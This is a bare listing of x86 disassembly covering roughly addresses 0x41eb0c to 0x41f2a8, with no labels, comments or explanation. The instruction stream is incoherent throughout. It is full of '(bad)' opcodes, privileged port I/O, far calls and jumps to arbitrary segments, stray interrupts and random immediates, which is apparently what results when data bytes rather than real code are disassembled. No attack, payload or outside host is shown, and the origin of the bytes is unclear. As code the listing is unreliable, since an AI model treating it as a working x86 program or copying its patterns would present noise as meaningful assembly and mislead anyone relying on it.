  41eb0c:	ja     0x41eb2c
  41eb0e:	mov    edi,0xe18dbd46
  41eb13:	pop    ebp
  41eb14:	jo     0x41eac4
  41eb16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb17:	xor    al,0xb5
  41eb19:	(bad)  
  41eb1a:	fcomp  st(1)
  41eb1c:	sbb    ebx,DWORD PTR [edi-0x5a2826d]
  41eb22:	inc    esi
  41eb23:	out    dx,eax
  41eb24:	das    
  41eb25:	and    eax,DWORD PTR [ecx]
  41eb27:	fbstp  TBYTE PTR [ebx]
  41eb29:	mov    ecx,esp
  41eb2b:	iret   
  41eb2c:	leave  
  41eb2d:	idiv   BYTE PTR ds:[ebp*8-0x49050560]
  41eb35:	mov    edx,0x9e7364c6
  41eb3a:	push   DWORD PTR [esi+ebx*2]
  41eb3d:	js     0x41eaf3
  41eb3f:	xchg   ebp,eax
  41eb40:	and    bl,BYTE PTR ds:0x3bde7829
  41eb46:	sub    DWORD PTR [ebp+edx*8-0x7f],ebx
  41eb4a:	ffree  st(4)
  41eb4c:	test   DWORD PTR [edx-0x1910c0a3],edx
  41eb52:	jge    0x41eb95
  41eb54:	aaa    
  41eb55:	mov    bl,0xe8
  41eb57:	add    al,0xb5
  41eb59:	xchg   esi,eax
  41eb5a:	(bad)  
  41eb5b:	jo     0x41ebd2
  41eb5d:	in     al,0xd9
  41eb5f:	nop
  41eb60:	push   esi
  41eb61:	fidiv  DWORD PTR [edx-0x62]
  41eb64:	inc    ebp
  41eb65:	rol    BYTE PTR [ebx+0x7eb73038],1
  41eb6b:	mov    ch,BYTE PTR [edi+ecx*2+0x5c]
  41eb6f:	sub    DWORD PTR [esi+0x26a87459],eax
  41eb75:	out    0x39,eax
  41eb77:	sahf   
  41eb78:	ins    BYTE PTR es:[edi],dx
  41eb79:	dec    esi
  41eb7a:	mov    edi,0xa0a733a
  41eb7f:	arpl   WORD PTR [edi],di
  41eb81:	cdq    
  41eb82:	push   esi
  41eb83:	push   esi
  41eb84:	pop    edx
  41eb85:	mov    esi,0xcfffc998
  41eb8a:	in     eax,0xc2
  41eb8c:	cmc    
  41eb8d:	jno    0x41eb53
  41eb8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb90:	outs   dx,BYTE PTR ds:[esi]
  41eb91:	call   0x5af9:0xd46c7d7b
  41eb98:	cmc    
  41eb99:	xchg   ecx,eax
  41eb9a:	les    ecx,FWORD PTR [edi]
  41eb9c:	sub    ebx,0xeafb2296
  41eba2:	inc    ecx
  41eba3:	lods   al,BYTE PTR ds:[esi]
  41eba4:	js     0x41eb88
  41eba6:	sub    DWORD PTR [ebx-0x24],ebp
  41eba9:	sahf   
  41ebaa:	xchg   edi,eax
  41ebab:	xchg   edx,eax
  41ebac:	fldcw  WORD PTR [ebp+0x1]
  41ebaf:	pushf  
  41ebb0:	pusha  
  41ebb1:	push   ss
  41ebb2:	sub    BYTE PTR [esi],al
  41ebb4:	add    al,0xfa
  41ebb6:	push   ebx
  41ebb7:	add    BYTE PTR [edi+0x256be80c],bl
  41ebbd:	pop    edx
  41ebbe:	push   eax
  41ebbf:	dec    edx
  41ebc0:	jecxz  0x41eb54
  41ebc2:	sti    
  41ebc3:	sbb    DWORD PTR [esi-0x12],ecx
  41ebc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebc7:	inc    esi
  41ebc8:	mov    ecx,0x2369a8e7
  41ebcd:	ror    eax,0x11
  41ebd0:	sbb    BYTE PTR [eax],al
  41ebd2:	test   bl,0x6f
  41ebd5:	sbb    ecx,esp
  41ebd7:	xchg   esi,eax
  41ebd8:	rol    BYTE PTR [edi],1
  41ebda:	in     eax,0xe2
  41ebdc:	rol    dh,0x85
  41ebdf:	ins    BYTE PTR es:[edi],dx
  41ebe0:	dec    ebp
  41ebe1:	add    eax,0xfe0f23f7
  41ebe6:	xor    al,0x5
  41ebe8:	or     ah,bh
  41ebea:	sub    edi,0xffffffa8
  41ebed:	pop    ebx
  41ebee:	jecxz  0x41ebb2
  41ebf0:	sbb    esi,DWORD PTR [eax]
  41ebf2:	into   
  41ebf3:	jno    0x41ec3f
  41ebf5:	lods   eax,DWORD PTR ds:[esi]
  41ebf6:	push   cs
  41ebf7:	add    ebx,DWORD PTR [edi+ecx*4-0x33612770]
  41ebfe:	or     dh,BYTE PTR [edx+edi*4-0x4e1d47e9]
  41ec05:	jo     0x41ec0d
  41ec07:	push   esp
  41ec08:	xor    eax,0xa7641744
  41ec0d:	sbb    esp,DWORD PTR [esi]
  41ec0f:	or     DWORD PTR [eax-0x39923ac8],ebp
  41ec15:	jno    0x41ebb5
  41ec17:	mov    eax,ds:0xa8e724ca
  41ec1c:	test   cl,ch
  41ec1e:	cmc    
  41ec1f:	pop    esp
  41ec20:	cld    
  41ec21:	mov    ecx,esp
  41ec23:	ficom  WORD PTR [ebp-0x71285012]
  41ec29:	xor    DWORD PTR gs:[eax-0x3220fd30],0x2121aa3e
  41ec34:	int3   
  41ec35:	div    cl
  41ec37:	call   0x27a2:0x7b53cb5f
  41ec3e:	jnp    0x41ec09
  41ec40:	ret    
  41ec41:	repz lea edi,[edi-0x6727a4bb]
  41ec48:	fldenv [edx-0x52]
  41ec4b:	gs mov esi,0xb91df874
  41ec51:	dec    esi
  41ec52:	cmp    ecx,DWORD PTR [ebx+0x703c2619]
  41ec58:	pop    esi
  41ec59:	gs jmp 0x41eca1
  41ec5c:	xchg   ecx,edi
  41ec5e:	lods   eax,DWORD PTR ds:[esi]
  41ec5f:	push   ds
  41ec60:	or     DWORD PTR [ebp+0x1ba52b0],esp
  41ec66:	or     ecx,esp
  41ec68:	adc    dh,BYTE PTR [ecx-0x48]
  41ec6b:	dec    esi
  41ec6c:	xor    eax,0xee232231
  41ec71:	aam    0xdc
  41ec73:	xchg   DWORD PTR [ebx-0x1],ebx
  41ec76:	cmp    bl,bh
  41ec78:	hlt    
  41ec79:	rol    BYTE PTR [ebp-0x4],1
  41ec7c:	xchg   esi,eax
  41ec7d:	add    eax,0xd8bcfa0d
  41ec82:	fnstsw WORD PTR [edi+0x1c]
  41ec85:	dec    eax
  41ec86:	pop    eax
  41ec87:	test   eax,0x6a97bd5c
  41ec8c:	xchg   edx,eax
  41ec8d:	sub    DWORD PTR [edx+edx*2],edx
  41ec90:	lods   eax,DWORD PTR ds:[esi]
  41ec91:	inc    eax
  41ec92:	lods   al,BYTE PTR ds:[esi]
  41ec93:	cdq    
  41ec94:	ins    DWORD PTR es:[edi],dx
  41ec95:	jae    0x41ed04
  41ec97:	inc    ecx
  41ec98:	push   ecx
  41ec99:	inc    ebx
  41ec9a:	xchg   esp,eax
  41ec9b:	inc    ecx
  41ec9c:	fdiv   QWORD PTR [edx]
  41ec9e:	mov    eax,ds:0x1b14edb4
  41eca3:	in     al,dx
  41eca4:	xor    edi,DWORD PTR [esi]
  41eca6:	cld    
  41eca7:	dec    ebx
  41eca8:	push   0x5688eeb8
  41ecad:	or     BYTE PTR [edx+edx*4],bh
  41ecb0:	mov    es,WORD PTR [ecx+0x57cce629]
  41ecb6:	pushf  
  41ecb7:	popa   
  41ecb8:	cmp    cl,dl
  41ecba:	(bad)  
  41ecbb:	sub    ebx,DWORD PTR [ebx]
  41ecbd:	xchg   esp,eax
  41ecbe:	pop    ebx
  41ecbf:	fistp  QWORD PTR [ebp+0x34cddb36]
  41ecc5:	mov    eax,0xe9169d36
  41ecca:	push   es
  41eccb:	xor    BYTE PTR [ebx-0x49],dh
  41ecce:	enter  0x52f3,0x8c
  41ecd2:	jne    0x41eced
  41ecd4:	aad    0xac
  41ecd6:	sbb    bl,bh
  41ecd8:	fbstp  TBYTE PTR [ebx-0x1ebb9d42]
  41ecde:	(bad)  
  41ecdf:	adc    al,0xf9
  41ece1:	mov    DWORD PTR [esi+eiz*2+0x5],ebp
  41ece5:	sbb    edi,DWORD PTR [esi+ecx*2-0x4cc2ccd8]
  41ecec:	push   edx
  41eced:	sub    BYTE PTR ds:0x8bf9f0be,0x97
  41ecf4:	mov    ch,ah
  41ecf6:	push   ebx
  41ecf7:	mov    dl,0x75
  41ecf9:	add    al,0x37
  41ecfb:	(bad)
  41ecfe:	addr16 mov ch,0xbf
  41ed01:	fs push eax
  41ed03:	pop    esp
  41ed04:	pushf  
  41ed05:	lods   al,BYTE PTR ds:[esi]
  41ed06:	or     esp,DWORD PTR gs:[esi-0x3c534209]
  41ed0d:	fsub   QWORD PTR [ecx+0x6a8c19a4]
  41ed13:	sbb    ebp,DWORD PTR [ebp-0x5f]
  41ed16:	test   DWORD PTR [edx-0x72365357],esi
  41ed1c:	mov    cl,0x7e
  41ed1e:	dec    esp
  41ed1f:	mov    esi,0x2cdbcb5e
  41ed24:	ins    DWORD PTR es:[edi],dx
  41ed25:	aas    
  41ed26:	push   esi
  41ed27:	shr    BYTE PTR [edx],cl
  41ed29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed2a:	mov    dl,0x19
  41ed2c:	cmp    DWORD PTR ds:0xb732f853,eax
  41ed32:	call   0x2073d5c8
  41ed37:	not    DWORD PTR [ecx-0x5fb9f323]
  41ed3d:	ret    0x7a56
  41ed40:	pushf  
  41ed41:	pop    ss
  41ed42:	xor    al,BYTE PTR [esp+edi*8]
  41ed45:	(bad)  
  41ed46:	add    ebx,DWORD PTR [edx-0x8ff839a]
  41ed4c:	xchg   ebx,eax
  41ed4d:	or     al,0xc6
  41ed4f:	imul   ebx,DWORD PTR [ebx+0x14ba957c],0x3d
  41ed56:	stos   DWORD PTR es:[edi],eax
  41ed57:	icebp  
  41ed58:	jae    0x41ed1c
  41ed5a:	xor    eax,DWORD PTR [ebx-0x13810cc3]
  41ed60:	sti    
  41ed61:	cs jp  0x41ed6e
  41ed64:	inc    ebp
  41ed65:	and    BYTE PTR [edi-0x2f],bh
  41ed68:	or     cl,cl
  41ed6a:	rol    BYTE PTR [ebp-0x3d],cl
  41ed6d:	imul   esi,DWORD PTR [ebx],0xea003f96
  41ed73:	popa   
  41ed74:	ror    BYTE PTR [ecx-0x64],0xbd
  41ed78:	cmc    
  41ed79:	push   edi
  41ed7a:	scas   al,BYTE PTR es:[edi]
  41ed7b:	mov    cl,0xec
  41ed7d:	mov    ebx,0xd94ce5b2
  41ed82:	push   eax
  41ed83:	test   BYTE PTR [ebx-0x5f],bh
  41ed86:	xor    DWORD PTR [ecx],esi
  41ed88:	sbb    al,0x13
  41ed8a:	sbb    edi,esp
  41ed8c:	dec    ebp
  41ed8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed8e:	loop   0x41ed83
  41ed90:	bound  ecx,QWORD PTR [edx+edx*1-0x52]
  41ed94:	test   al,0x66
  41ed96:	adc    eax,0xda3ebf10
  41ed9b:	inc    eax
  41ed9c:	(bad)  
  41ed9e:	or     eax,0x9edd1c02
  41eda3:	in     eax,dx
  41eda4:	fmul   DWORD PTR [ecx]
  41eda6:	lahf   
  41eda7:	xlat   BYTE PTR ds:[ebx]
  41eda8:	rcl    ah,cl
  41edaa:	adc    BYTE PTR [edi+edi*1],dh
  41edad:	enter  0xb067,0xaa
  41edb1:	mov    ds:0x81ce59a1,al
  41edb6:	out    0xa1,al
  41edb8:	nop
  41edb9:	ds dec ebp
  41edbb:	cmp    eax,0xaa7b49aa
  41edc0:	cmc    
  41edc1:	stc    
  41edc2:	leave  
  41edc3:	stc    
  41edc4:	jmp    0x98c7:0x9d505474
  41edcb:	inc    eax
  41edcc:	mov    esp,0xa9fd6d8
  41edd1:	jg     0x41ee4d
  41edd3:	jle    0x41edb6
  41edd5:	call   DWORD PTR [ebp-0x4f]
  41edd8:	add    ch,BYTE PTR [edx-0x49]
  41eddb:	inc    ebx
  41eddc:	cmp    BYTE PTR [edx-0x4cde50ad],bl
  41ede2:	into   
  41ede3:	aam    0x4
  41ede5:	aam    0xaa
  41ede7:	(bad)  
  41ede8:	push   esp
  41ede9:	div    DWORD PTR [ebx]
  41edeb:	mov    edi,0xee000455
  41edf0:	aaa    
  41edf1:	and    BYTE PTR [ecx+0x4ad7c189],dl
  41edf7:	jno    0x41ee5d
  41edf9:	push   ebp
  41edfa:	repz call 0x349fdb72
  41ee00:	sbb    al,0xce
  41ee02:	pushf  
  41ee03:	sub    esp,ecx
  41ee05:	push   esp
  41ee06:	pop    sp
  41ee08:	enter  0x4ba1,0x3a
  41ee0c:	xchg   DWORD PTR [esi+0x67cb044d],edi
  41ee12:	addr16 jmp 0x39a6:0x1dff487d
  41ee1a:	stos   DWORD PTR es:[edi],eax
  41ee1b:	xchg   edx,eax
  41ee1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee1d:	fstp   TBYTE PTR [ebp+0x77]
  41ee20:	nop
  41ee21:	je     0x41edc3
  41ee23:	add    ebp,edi
  41ee25:	ret    
  41ee26:	sub    ecx,DWORD PTR [ecx-0x1893d802]
  41ee2c:	jg     0x41ee3a
  41ee2e:	neg    esi
  41ee30:	jbe    0x41ee5f
  41ee32:	jge    0x41ee1e
  41ee34:	dec    esi
  41ee35:	jmp    0x2faf:0x4fc4e29c
  41ee3c:	add    al,0xbd
  41ee3e:	inc    BYTE PTR [eax]
  41ee40:	test   BYTE PTR [edx-0x80],cl
  41ee43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee44:	scas   al,BYTE PTR es:[edi]
  41ee45:	xchg   DWORD PTR [ebx],edi
  41ee47:	aam    0xb1
  41ee49:	mov    bl,0xb4
  41ee4b:	sub    DWORD PTR [ecx-0x1ac3d290],esi
  41ee51:	cmc    
  41ee52:	ins    DWORD PTR es:[edi],dx
  41ee53:	pop    esi
  41ee54:	and    BYTE PTR [ebx-0x3e28ca05],bl
  41ee5a:	or     BYTE PTR [edi+0x45],bh
  41ee5d:	inc    edx
  41ee5e:	jnp    0x41ee3e
  41ee60:	int    0x3b
  41ee62:	cmp    eax,0x78de3119
  41ee67:	js     0x41ee3c
  41ee69:	cmp    esi,edx
  41ee6b:	int    0x8a
  41ee6d:	and    ecx,esp
  41ee6f:	or     esi,DWORD PTR [esi-0x5b]
  41ee72:	jg     0x41ee68
  41ee74:	in     al,dx
  41ee75:	test   eax,0x142ec1eb
  41ee7a:	xchg   BYTE PTR [edx+0x13],al
  41ee7d:	bswap  edi
  41ee7f:	xor    al,0x40
  41ee81:	int    0x5b
  41ee83:	bound  eax,QWORD PTR [ecx+eax*2-0x2c]
  41ee87:	mov    ebp,0x97f63055
  41ee8c:	adc    esi,DWORD PTR [ecx-0x15]
  41ee8f:	cmp    DWORD PTR [eax+edx*4],esi
  41ee92:	xor    eax,0x920761e0
  41ee97:	adc    edx,DWORD PTR [eax+0x7a13a9c0]
  41ee9d:	rol    BYTE PTR [edi+edi*8+0xc],cl
  41eea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eea2:	fcomp  DWORD PTR [ebp-0x6c85c993]
  41eea8:	add    al,0x3a
  41eeaa:	(bad)  
  41eeab:	pop    ebx
  41eeac:	or     eax,0xcb26c5e8
  41eeb1:	pop    ebp
  41eeb2:	mov    dl,0xa5
  41eeb4:	or     al,BYTE PTR [ebp+ecx*8+0xd]
  41eeb8:	mov    ebx,DWORD PTR [ebx+0x71]
  41eebb:	mov    al,ds:0xca7fcafe
  41eec0:	ds push esp
  41eec2:	in     al,0xef
  41eec4:	mov    ch,0xd9
  41eec6:	(bad)  
  41eec7:	rol    BYTE PTR [ecx-0x53],cl
  41eeca:	icebp  
  41eecb:	cmp    DWORD PTR [ebp-0x1b0ab169],eax
  41eed1:	test   al,0x5d
  41eed3:	fmul   st(6),st
  41eed5:	retf   
  41eed6:	cs sub al,0xca
  41eed9:	mov    ds:0x54723626,al
  41eede:	xor    BYTE PTR [ebx],ch
  41eee0:	adc    al,0x21
  41eee2:	fisub  DWORD PTR [edx+0x7d]
  41eee5:	push   ds
  41eee6:	rcl    BYTE PTR [ebp+0x20],0x93
  41eeea:	cmp    eax,0x9998630e
  41eeef:	call   0x4a6c4de5
  41eef4:	test   BYTE PTR [ecx-0x2a13adb3],0xc6
  41eefb:	stos   BYTE PTR es:[di],al
  41eefd:	adc    eax,0xc63c96f8
  41ef02:	adc    ebx,DWORD PTR [edx-0x6ee4c5f0]
  41ef08:	(bad)  
  41ef09:	sbb    eax,0x7e95f5c2
  41ef0e:	bound  ebp,QWORD PTR [ecx-0x50]
  41ef11:	das    
  41ef12:	mov    al,ds:0x9a63f549
  41ef17:	ret    0x8342
  41ef1a:	int    0x8a
  41ef1c:	add    edx,eax
  41ef1e:	inc    esp
  41ef1f:	div    BYTE PTR [ebx-0x6547e703]
  41ef25:	adc    ebx,DWORD PTR [eax]
  41ef27:	jo     0x41eeeb
  41ef29:	and    BYTE PTR [edx+eiz*2-0xc95977],ah
  41ef30:	lods   eax,DWORD PTR ds:[esi]
  41ef31:	mov    bl,0x24
  41ef33:	cdq    
  41ef34:	(bad)  
  41ef35:	dec    esp
  41ef36:	sub    bh,ch
  41ef38:	sar    BYTE PTR [esp+ecx*1-0x2a1d7ce1],1
  41ef3f:	pop    ds
  41ef40:	loope  0x41eef5
  41ef42:	mov    fs,esi
  41ef44:	call   0x6342:0x8f13e146
  41ef4b:	sbb    ecx,DWORD PTR [ebx+eiz*8]
  41ef4e:	or     esi,DWORD PTR [esi]
  41ef50:	daa    
  41ef51:	ror    BYTE PTR [ecx-0x569338b5],0x57
  41ef58:	lahf   
  41ef59:	test   DWORD PTR [ebp+0x6406c3e0],edx
  41ef5f:	xor    cl,dh
  41ef61:	sub    ebp,DWORD PTR [ebx-0x50d707cc]
  41ef67:	ror    DWORD PTR ds:0xa0c9493c,1
  41ef6d:	and    al,0x29
  41ef6f:	pop    ds
  41ef70:	and    al,0x3b
  41ef72:	ins    DWORD PTR es:[edi],dx
  41ef73:	int    0x10
  41ef75:	mov    edi,0x8044f6a5
  41ef7a:	fsubp  st(7),st
  41ef7c:	shr    DWORD PTR [ebp-0x6f],cl
  41ef7f:	add    cl,al
  41ef81:	sub    ch,bl
  41ef83:	call   0x77f6:0x2c1251ba
  41ef8a:	(bad)  
  41ef8b:	(bad)  
  41ef8c:	and    ecx,DWORD PTR ds:0x3b51989e
  41ef92:	add    eax,0x712f6a33
  41ef97:	mov    esi,fs
  41ef99:	gs mov ch,0x68
  41ef9c:	lods   al,BYTE PTR es:[esi]
  41ef9e:	test   eax,0xbc0c9083
  41efa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efa4:	ins    BYTE PTR es:[edi],dx
  41efa5:	mov    BYTE PTR [ebx-0x62],cl
  41efa8:	cmp    bp,ax
  41efab:	cld    
  41efac:	sub    dh,0xf3
  41efaf:	push   cs
  41efb0:	lds    edx,FWORD PTR [esi+0x37fda45a]
  41efb6:	fsubr  st,st(2)
  41efb8:	fidivr WORD PTR [eax+0x41d1cadb]
  41efbe:	dec    esi
  41efbf:	bound  ebp,QWORD PTR [edx+0x4f562aef]
  41efc5:	adc    BYTE PTR [eax+0x70],dl
  41efc8:	inc    ebp
  41efc9:	in     al,dx
  41efca:	mov    ds:0xdabaa290,eax
  41efcf:	test   ah,al
  41efd1:	sub    esp,ebp
  41efd3:	enter  0xf9f7,0x6d
  41efd7:	mov    al,ds:0xcb0908d0
  41efdc:	mov    edx,0xaf29da8b
  41efe1:	mov    ?,WORD PTR [ebx-0x27907658]
  41efe7:	sahf   
  41efe8:	aas    
  41efe9:	pushf  
  41efea:	cmp    eax,0x343781c7
  41efef:	sbb    DWORD PTR [esi+0x4c1af120],edx
  41eff5:	lock aas 
  41eff7:	cmp    ebx,DWORD PTR [eax+edx*2]
  41effa:	and    ebp,DWORD PTR [esi]
  41effc:	dec    ecx
  41effd:	fidiv  DWORD PTR [edx-0x45]
  41f000:	push   edi
  41f001:	test   BYTE PTR [ecx-0x571e255e],0x9a
  41f008:	ror    esp,1
  41f00a:	hlt    
  41f00b:	or     al,0x52
  41f00d:	fidivr DWORD PTR [eax-0x76eec24f]
  41f013:	and    eax,0x8d3de631
  41f018:	adc    BYTE PTR ds:0x7d2215b,bh
  41f01e:	push   es
  41f01f:	inc    esp
  41f020:	(bad)  
  41f021:	aam    0x21
  41f023:	mov    ebp,0x136f389a
  41f028:	(bad)  
  41f029:	aam    0xaa
  41f02b:	es mov eax,0xa8ca12c4
  41f031:	sub    dl,BYTE PTR [ecx+0x2fa610b5]
  41f037:	scas   al,BYTE PTR es:[edi]
  41f038:	call   0xa379141f
  41f03d:	mov    eax,ds:0x833d60f
  41f042:	ss cmp eax,0x4cfefdd1
  41f048:	pusha  
  41f049:	mov    BYTE PTR [eax+0x31],cl
  41f04c:	and    BYTE PTR [edi-0x49],al
  41f04f:	jle    0x41f067
  41f051:	in     al,0x87
  41f053:	adc    al,0xba
  41f055:	and    cl,ch
  41f057:	lock (bad) 
  41f059:	fcom   QWORD PTR [edi]
  41f05b:	inc    ebp
  41f05c:	clc    
  41f05d:	cmc    
  41f05e:	mov    al,0xf1
  41f060:	out    0x4e,eax
  41f062:	fwait
  41f063:	xor    esi,DWORD PTR [ecx-0x6e3e2ef1]
  41f069:	aad    0x60
  41f06b:	imul   ebp,DWORD PTR [edi+ecx*1-0x47],0xffffffa7
  41f070:	sbb    ebp,DWORD PTR [eax]
  41f072:	mov    al,0x92
  41f074:	cs mov ebx,0x9939c641
  41f07a:	and    al,BYTE PTR ds:0xc244aaef
  41f080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f081:	lods   eax,DWORD PTR ds:[esi]
  41f082:	jecxz  0x41f0aa
  41f084:	sub    eax,0x1530a21f
  41f089:	daa    
  41f08a:	scas   eax,DWORD PTR es:[edi]
  41f08b:	imul   esp,DWORD PTR [edx-0x4ce9aa7e],0x92a72e7e
  41f095:	dec    edi
  41f096:	or     DWORD PTR [eax-0x4d2399ef],esp
  41f09c:	imul   edi,DWORD PTR [edi-0x7086b2ea],0xfcbf80a8
  41f0a6:	mov    ds:0x2ecf292a,al
  41f0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0ac:	ror    BYTE PTR [eax+0x5b],0xda
  41f0b0:	pop    es
  41f0b1:	dec    ebx
  41f0b2:	hlt    
  41f0b3:	call   0xb082:0xcde4be5e
  41f0ba:	xchg   edi,eax
  41f0bb:	outs   dx,BYTE PTR ds:[esi]
  41f0bc:	pop    ebp
  41f0bd:	push   esp
  41f0be:	mov    al,0xb1
  41f0c0:	xor    eax,0xfe8d2583
  41f0c5:	dec    esi
  41f0c6:	popf   
  41f0c7:	mov    BYTE PTR [ecx+0x676da7aa],dh
  41f0cd:	lock xor ecx,DWORD PTR [ecx+0x76b16136]
  41f0d4:	adc    DWORD PTR [esi+0x24ab9511],esp
  41f0da:	nop
  41f0db:	sub    ch,BYTE PTR [ecx+0x5e]
  41f0de:	xlat   BYTE PTR ds:[ebx]
  41f0df:	gs or  al,0xee
  41f0e2:	sub    bh,bl
  41f0e4:	ss xor eax,0xbb693ff6
  41f0ea:	xchg   ebp,eax
  41f0eb:	pop    ebx
  41f0ec:	ret    
  41f0ed:	add    DWORD PTR [edx+0x1b],ebx
  41f0f0:	repz sbb ebx,DWORD PTR [edx+ebx*1]
  41f0f4:	push   ebp
  41f0f5:	cdq    
  41f0f6:	inc    eax
  41f0f7:	push   0xffffffa2
  41f0f9:	mov    dl,0x52
  41f0fb:	int3   
  41f0fc:	idiv   ebx
  41f0fe:	adc    bh,BYTE PTR [edx+0x56]
  41f101:	arpl   WORD PTR [eax+ebp*4],ax
  41f104:	add    al,BYTE PTR [ebx+0x4c]
  41f107:	pop    ds
  41f108:	jecxz  0x41f0da
  41f10a:	mov    es,WORD PTR [ecx]
  41f10c:	scas   al,BYTE PTR es:[edi]
  41f10d:	ja     0x41f14c
  41f10f:	mov    ah,0xe7
  41f111:	daa    
  41f112:	xor    esi,DWORD PTR es:[edi-0x3d]
  41f116:	popf   
  41f117:	push   edx
  41f118:	pop    ss
  41f119:	in     al,0xae
  41f11b:	xchg   DWORD PTR [edx-0x16],edi
  41f11e:	popa   
  41f11f:	lods   al,BYTE PTR ds:[esi]
  41f120:	push   eax
  41f121:	add    esi,0x58466b46
  41f127:	int    0xd4
  41f129:	dec    edi
  41f12a:	(bad)  
  41f12b:	stc    
  41f12c:	push   edx
  41f12d:	dec    ebx
  41f12e:	bnd jg 0x41f0c7
  41f131:	add    BYTE PTR [edi+0x1],ch
  41f134:	fwait
  41f135:	mov    al,ds:0x3850e88b
  41f13a:	or     BYTE PTR [ebp+0x4a],dl
  41f13d:	cld    
  41f13e:	sbb    al,0x89
  41f140:	mov    ebp,0xaf9ef1fa
  41f145:	cli    
  41f146:	out    dx,al
  41f147:	jmp    0x23b9d4d2
  41f14c:	or     BYTE PTR [eax+0x6c],cl
  41f14f:	add    al,0xaa
  41f151:	or     esi,DWORD PTR [ebx-0x5b269573]
  41f157:	div    DWORD PTR [eax-0x659b9fd4]
  41f15d:	mov    eax,0x9fd4ee76
  41f162:	sub    eax,0xc429009e
  41f167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f168:	lods   eax,DWORD PTR ds:[esi]
  41f169:	jp     0x41f1a7
  41f16b:	and    al,ch
  41f16d:	xchg   ebp,eax
  41f16e:	sbb    dh,BYTE PTR [esi+ecx*1+0x35]
  41f172:	mov    esp,0x44aa50ec
  41f177:	aad    0x12
  41f179:	in     eax,0xa2
  41f17b:	push   cs
  41f17c:	push   ebp
  41f17d:	fwait
  41f17e:	int3   
  41f17f:	call   FWORD PTR [eax+0x2f8a1dd9]
  41f185:	aaa    
  41f186:	push   ds
  41f187:	les    eax,FWORD PTR [eax+0x17]
  41f18a:	xchg   esp,eax
  41f18b:	mov    DWORD PTR [edi-0x16],esp
  41f18e:	daa    
  41f18f:	hlt    
  41f190:	test   dl,ah
  41f192:	jbe    0x41f160
  41f194:	mov    eax,0x56c194ba
  41f199:	(bad)  
  41f19b:	inc    esi
  41f19c:	lock imul ebp,esi,0x7e
  41f1a0:	mov    ebx,0x9518fa77
  41f1a5:	shl    BYTE PTR [ebx-0xaa45404],cl
  41f1ab:	fisttp DWORD PTR [edx-0x13504b03]
  41f1b1:	jno    0x41f1e7
  41f1b3:	inc    edi
  41f1b4:	or     bl,BYTE PTR [ebx-0x1e765912]
  41f1ba:	add    ebx,DWORD PTR [ecx+0x26915813]
  41f1c0:	push   0x61
  41f1c2:	sub    BYTE PTR [esi+esi*1+0x4b],ch
  41f1c6:	cwde   
  41f1c7:	pop    esp
  41f1c8:	cmc    
  41f1c9:	ja     0x41f20f
  41f1cb:	dec    esp
  41f1cc:	js     0x41f236
  41f1ce:	cmp    BYTE PTR [eax+0x1e5464b7],bh
  41f1d4:	mov    cl,al
  41f1d6:	xor    ch,BYTE PTR [esi+0x73d1c858]
  41f1dc:	pop    edi
  41f1dd:	mov    eax,ds:0x1c393a83
  41f1e2:	mov    cl,0xfc
  41f1e4:	int3   
  41f1e5:	test   al,0xee
  41f1e7:	test   eax,0x2bd5f72b
  41f1ed:	gs jmp 0x3f3a2d0c
  41f1f3:	mov    ecx,0x16c200d
  41f1f8:	in     al,0xba
  41f1fa:	pop    edx
  41f1fb:	call   0xf95e64e0
  41f200:	outs   dx,DWORD PTR ds:[esi]
  41f201:	lds    ebp,FWORD PTR [ebp+eiz*2+0x39]
  41f205:	or     DWORD PTR [esi],edi
  41f207:	pop    edi
  41f208:	cmc    
  41f209:	jmp    0x55455701
  41f20e:	mov    cl,0xf
  41f210:	cmp    eax,0xb1632c8a
  41f215:	test   al,0x74
  41f217:	leave  
  41f218:	add    edx,esp
  41f21a:	outs   dx,DWORD PTR ds:[esi]
  41f21b:	sub    eax,0x8d32b50c
  41f220:	mov    ecx,0x1fcfaa25
  41f225:	mov    edi,DWORD PTR [eax+edi*2+0x7b]
  41f229:	xor    eax,edx
  41f22b:	loopne 0x41f1e4
  41f22d:	adc    bl,BYTE PTR [ecx+0x71]
  41f230:	push   0x46
  41f232:	pusha  
  41f233:	mov    ah,cl
  41f235:	out    dx,eax
  41f236:	(bad)
  41f239:	jns    0x41f1cb
  41f23b:	jle    0x41f1fe
  41f23d:	and    eax,0xe4755cb
  41f242:	mov    edi,DWORD PTR [edi+eax*2+0x44]
  41f246:	jno    0x41f244
  41f248:	mov    ch,0xb8
  41f24a:	ret    0xabda
  41f24d:	xchg   esi,eax
  41f24e:	into   
  41f24f:	je     0x41f1de
  41f251:	cmp    al,0x1d
  41f253:	add    bl,dh
  41f255:	mov    dh,0x84
  41f257:	adc    ah,BYTE PTR [ebx+0x24]
  41f25a:	or     BYTE PTR [edi-0x4a],0x77
  41f25e:	pushw  0x5439
  41f262:	jmp    0x41f216
  41f264:	sbb    edi,esi
  41f266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f267:	ret    0x8b2c
  41f26a:	add    BYTE PTR [edi],ah
  41f26c:	mov    dl,0x16
  41f26e:	addr16 xchg ecx,eax
  41f270:	loope  0x41f218
  41f272:	jnp    0x41f21f
  41f274:	jmp    0x378a:0xa1d87e7
  41f27b:	mov    esi,DWORD PTR [ebp+0x5ffe2e11]
  41f281:	loope  0x41f298
  41f283:	in     eax,dx
  41f284:	jmp    0x41f2de
  41f286:	sub    DWORD PTR [ebp+0x6fa32cd1],ecx
  41f28c:	sbb    DWORD PTR [esi+0x778a4712],0xffffffb2
  41f293:	push   esp
  41f294:	sbb    eax,0x8dd9c06f
  41f299:	mov    edx,0xfc8e9c74
  41f29e:	loopne 0x41f28a
  41f2a0:	xchg   ebp,ebx
  41f2a2:	out    0xc6,eax
  41f2a4:	push   0x44
  41f2a6:	jnp    0x41f2b1
  41f2a8:	iret   
